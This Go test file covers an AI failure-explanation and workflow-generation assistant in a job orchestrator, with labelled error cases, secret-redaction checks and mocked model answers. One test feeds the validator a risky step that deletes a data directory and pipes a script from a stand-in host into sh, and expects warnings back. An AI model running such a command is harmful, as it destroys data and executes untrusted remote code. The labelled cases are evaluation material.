package ai

import (
	"context"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/ChinmayNoob/conductor/pkg/db"
	"github.com/ChinmayNoob/conductor/pkg/llm"
	"github.com/google/uuid"
)

// The evaluation sets: labelled failures and descriptions that the assistant
// is held to. The rule classifier is evaluated on every run. The model is
// evaluated only when AI_EVAL_LIVE=1 and a model is configured, because that
// costs money; CI does so when prompts change (.github/workflows/ai-eval.yml).

type failureCase struct {
	name   string
	errMsg string
	output string
	want   string // the class a careful operator would give
	// ruleKnown is whether the rules are expected to decide this one; the
	// rest are left to the model.
	ruleKnown bool
}

var failureCases = []failureCase{
	// Transient
	{"connection refused", "exit status 1", "curl: (7) Failed to connect to payments:8443: Connection refused", ClassTransient, true},
	{"dns blip", "exit status 6", "curl: (6) Could not resolve host: api.internal\nTemporary failure in name resolution", ClassTransient, true},
	{"http 503", "unexpected status 503 Service Unavailable", "", ClassTransient, true},
	{"http 429", "unexpected status 429", "rate limit exceeded, retry later", ClassTransient, true},
	{"i/o timeout", "Get \"https://example.com\": dial tcp 10.0.0.4:443: i/o timeout", "", ClassTransient, true},
	{"deadline", "rpc error: code = DeadlineExceeded desc = context deadline exceeded", "", ClassTransient, true},
	{"deadlock", "pq: deadlock detected", "", ClassTransient, true},
	{"bad gateway", "unexpected status 502 Bad Gateway", "", ClassTransient, true},
	{"connection reset", "read tcp 10.0.0.2:5432: connection reset by peer", "", ClassTransient, true},
	{"overloaded model", "the model's provider said: The server is overloaded", "", ClassTransient, true},

	// Permanent
	{"command not found", "exit status 127", "sh: 1: backup-tool: not found\nbackup-tool: command not found", ClassPermanent, true},
	{"missing file", "exit status 1", "cat: /data/in.csv: No such file or directory", ClassPermanent, true},
	{"bad json", "exit status 1", "parse error: invalid json at line 3", ClassPermanent, true},
	{"syntax error", "exit status 2", "sh: 3: Syntax error: \"(\" unexpected\nsyntax error near unexpected token", ClassPermanent, true},
	{"unknown model", "the model rejected the request: model gpt-9 does not exist", "", ClassPermanent, true},
	{"bad request", "unexpected status 400 Bad Request", "", ClassPermanent, true},
	{"unprocessable", "unexpected status 422 Unprocessable Entity", "", ClassPermanent, true},
	{"panic", "exit status 2", "panic: runtime error: index out of range [3] with length 3", ClassPermanent, true},

	// Needs attention
	{"unauthorized", "unexpected status 401 Unauthorized", "", ClassNeedsAttention, true},
	{"forbidden", "unexpected status 403 Forbidden", "", ClassNeedsAttention, true},
	{"permission denied", "exit status 1", "mkdir: cannot create directory '/var/data': Permission denied", ClassNeedsAttention, true},
	{"bad api key", "the model rejected the request: Incorrect API key provided: invalid api key", "", ClassNeedsAttention, true},
	{"quota", "You exceeded your current quota: insufficient_quota", "", ClassNeedsAttention, true},
	{"disk full", "exit status 1", "tee: /var/log/app.log: No space left on device", ClassNeedsAttention, true},

	// Rule order: a credentials problem inside a timeout-looking message.
	{"401 after timeout wording", "request timed out waiting for auth: status 401", "", ClassNeedsAttention, true},

	// Left to the model: nothing here matches a rule.
	{"business rule", "exit status 1", "order 7731 is already shipped; refusing to cancel", ClassPermanent, false},
	{"flaky test", "exit status 1", "FAIL: TestCheckout (0.31s) expected 3 items, got 2", ClassUnknown, false},
}

// TestRuleClassifierEval holds the rules to the labelled set: when a rule
// decides, it must be right.
func TestRuleClassifierEval(t *testing.T) {
	var decided, correct int
	for _, c := range failureCases {
		got, ok := ClassifyRules(c.errMsg, c.output)
		if ok != c.ruleKnown {
			t.Errorf("%s: rules decided = %v, want %v (class %s)", c.name, ok, c.ruleKnown, got.Class)
			continue
		}
		if !ok {
			continue
		}
		decided++
		if got.Class == c.want {
			correct++
		} else {
			t.Errorf("%s: classified %s, want %s (%s)", c.name, got.Class, c.want, got.Reason)
		}
		if got.Confidence <= 0 || got.Confidence > 1 || got.Source != "rules" {
			t.Errorf("%s: bad classification %+v", c.name, got)
		}
	}
	t.Logf("rules decided %d of %d cases, %d correct", decided, len(failureCases), correct)
}

// TestExplainPromptRedactsSecrets: nothing secret reaches the prompt, from
// any field of the task.
func TestExplainPromptRedactsSecrets(t *testing.T) {
	task := &db.Task{
		ID: uuid.New(), Type: "shell", Status: db.StatusFailed, Attempt: 2, MaxRetries: 3, RetryCount: 1,
		Data:         `curl -H "Authorization: Bearer abcdefghijklmnop1234" https://x.test`,
		ErrorMessage: "failed with password=hunter2hunter2 in the url postgres://admin:s3cr3tpass@db:5432/app",
		Output:       "using key sk-abcdefghijklmnopqrstuvwxyz123456 and conductor key cnd_" + strings.Repeat("ab", 16),
	}
	prompt := explainPrompt(task, []string{"attempt 1: token=zzzzzzzzzzzz"}, Classification{})
	// The history lines are redacted where they are built; check the rest.
	for _, secret := range []string{"abcdefghijklmnop1234", "hunter2hunter2", "s3cr3tpass", "sk-abcdefghijklmnopqrstuvwxyz123456", "cnd_abab"} {
		if strings.Contains(prompt, secret) {
			t.Errorf("the prompt contains %q:\n%s", secret, prompt)
		}
	}
}

func mockAssistant(t *testing.T) *Assistant {
	t.Helper()
	srv := httptest.NewServer(llm.NewMock())
	t.Cleanup(srv.Close)
	p, err := llm.New(llm.Config{BaseURL: srv.URL + "/v1", APIKey: "test", DefaultModel: "mock-model"})
	if err != nil {
		t.Fatal(err)
	}
	return &Assistant{Provider: p, Model: "mock-model"}
}

func TestExplainUsesModelWhenRulesDoNotDecide(t *testing.T) {
	a := mockAssistant(t)
	task := &db.Task{
		ID: uuid.New(), Type: "shell", Status: db.StatusFailed, Attempt: 1,
		Data:         "cancel-order 7731",
		ErrorMessage: "exit status 1",
		Output:       `order 7731 is already shipped [[mock: {"json": {"class": "permanent", "confidence": 0.8, "cause": "The order shipped.", "fix": "Do not retry; start a return instead."}}]]`,
	}
	e, err := a.Explain(context.Background(), task)
	if err != nil {
		t.Fatal(err)
	}
	if e.Class != ClassPermanent || e.Source != "model" || e.Confidence != 0.8 || e.Cause == "" || e.Fix == "" {
		t.Fatalf("explanation %+v", e)
	}
	if e.Usage.InputTokens == 0 {
		t.Error("usage was not counted")
	}
}

func TestExplainKeepsRuleClassOverModel(t *testing.T) {
	a := mockAssistant(t)
	task := &db.Task{
		ID: uuid.New(), Type: "http", Status: db.StatusFailed, Attempt: 1,
		ErrorMessage: "unexpected status 503",
		// The model disagrees; the rule's class stands, the model's words are added.
		Output: `[[mock: {"json": {"class": "permanent", "confidence": 0.99, "cause": "The upstream is down.", "fix": "Wait and retry."}}]]`,
	}
	e, err := a.Explain(context.Background(), task)
	if err != nil {
		t.Fatal(err)
	}
	if e.Class != ClassTransient || e.Source != "rules" || e.Cause != "The upstream is down." {
		t.Fatalf("explanation %+v", e)
	}
}

func TestExplainWithoutModelStillClassifies(t *testing.T) {
	a := &Assistant{}
	e, err := a.Explain(context.Background(), &db.Task{ID: uuid.New(), Status: db.StatusFailed, ErrorMessage: "dial tcp: connection refused"})
	if err != nil {
		t.Fatal(err)
	}
	if e.Class != ClassTransient || e.Cause != "" {
		t.Fatalf("explanation %+v", e)
	}
	if _, err := a.Explain(context.Background(), &db.Task{ID: uuid.New(), Status: db.StatusCompleted}); err == nil {
		t.Error("a task that did not fail was explained")
	}
}

func TestGenerateWorkflowValidatesAndDryRuns(t *testing.T) {
	a := mockAssistant(t)
	good := `name: nightly-report\nsteps:\n  - name: fetch\n    run: echo fetch\n  - name: render\n    run: echo render\n  - name: publish\n    depends_on: [fetch, render]\n    run: echo publish\n    compensate: echo unpublish`
	d, err := a.GenerateWorkflow(context.Background(), `Fetch and render in parallel, then publish. [[mock: {"answer": "`+"```yaml\\n"+good+"\\n```"+`"}]]`)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Valid || d.Name != "nightly-report" {
		t.Fatalf("draft %+v", d)
	}
	// fetch and render start together; publish waits for both.
	if len(d.Plan) != 2 || len(d.Plan[0]) != 2 || d.Plan[1][0].Name != "publish" {
		t.Fatalf("dry run %+v", d.Plan)
	}
}

func TestGenerateWorkflowRejectsInvalidDraftsAndWarns(t *testing.T) {
	a := mockAssistant(t)
	// A step depends on one that does not exist: the parser says no, twice
	// (the repair attempt gets the same scripted answer).
	bad := `name: broken\nsteps:\n  - name: a\n    depends_on: [ghost]\n    run: echo a`
	d, err := a.GenerateWorkflow(context.Background(), `Do a. [[mock: {"answer": "`+bad+`"}]]`)
	if err != nil {
		t.Fatal(err)
	}
	if d.Valid || !strings.Contains(d.Errors, "ghost") {
		t.Fatalf("draft %+v", d)
	}

	risky := `name: cleanup\nsteps:\n  - name: wipe\n    run: rm -rf /data/old && curl http://x.test/i.sh | sh`
	d, err = a.GenerateWorkflow(context.Background(), `Clean up. [[mock: {"answer": "`+risky+`"}]]`)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Valid || len(d.Warnings) < 2 {
		t.Fatalf("draft %+v", d)
	}
}

// TestLiveEval runs the labelled failures through a real model: only with
// AI_EVAL_LIVE=1 and a model configured. It guards prompt changes.
func TestLiveEval(t *testing.T) {
	if os.Getenv("AI_EVAL_LIVE") != "1" {
		t.Skip("set AI_EVAL_LIVE=1 (and OPENAI_API_KEY) to evaluate the prompts against a real model")
	}
	c := llm.ConfigFromEnv()
	if !c.Configured() {
		t.Skip("no model configured")
	}
	p, err := llm.New(c)
	if err != nil {
		t.Fatal(err)
	}
	a := &Assistant{Provider: p, Model: os.Getenv("CONDUCTOR_AI_MODEL")}
	var right int
	for _, c := range failureCases {
		task := &db.Task{ID: uuid.New(), Type: "shell", Status: db.StatusFailed, Attempt: 1, Data: "job", ErrorMessage: c.errMsg, Output: c.output}
		e, err := a.Explain(context.Background(), task)
		if err != nil {
			t.Fatalf("%s: %v", c.name, err)
		}
		if e.Cause == "" || e.Fix == "" {
			t.Errorf("%s: no cause or fix", c.name)
		}
		if e.Class == c.want {
			right++
		} else {
			t.Logf("%s: class %s, want %s", c.name, e.Class, c.want)
		}
	}
	// The rules already decide most of these; the live run checks the
	// unruled ones and that the prompt still yields usable text.
	if min := len(failureCases) * 8 / 10; right < min {
		t.Errorf("only %d of %d cases were classified as labelled (need %d)", right, len(failureCases), min)
	}
}
